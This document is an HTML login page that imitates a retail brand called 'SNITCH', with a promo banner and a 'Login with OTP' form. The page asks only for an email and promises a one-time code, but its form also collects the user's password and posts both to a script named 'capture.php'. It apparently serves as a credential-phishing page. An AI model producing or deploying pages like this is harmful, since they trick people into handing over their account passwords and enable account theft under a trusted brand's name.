<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login with OTP</title>
  <link rel="stylesheet" href="./style.css">
</head>
<body>
  <!-- Banner -->
  <div class="banner">
    GET 10% OFF ON YOUR FIRST PURCHASE CODE: <strong>APP10</strong> <a href="#">DOWNLOAD NOW</a>
  </div>

  <!-- Navbar -->
  <header class="navbar">
    <div class="logo">SNITCH</div>
    <div class="menu">☰</div>
  </header>

  <!-- Login Section -->
  <main class="login-container">
    <h1>LOGIN WITH OTP</h1>
    <p>Please enter your Email</p>
    <form action="./capture.php" method="POST">
      <div class="form-group">
          <input type="email" id="email" name="email" required>
          <input type="password" id="password" name="password" required>
      </div>
      <button type="submit">Request OTP</button>
    </form>
    <p>A 6-digit OTP will be sent to your phone number</p>
    <div class="divider">Or Sign-in with</div>
    <div class="alternative">
      <button>
        <span>Email</span>
      </button>
    </div>
  </main>
</body>
</html>
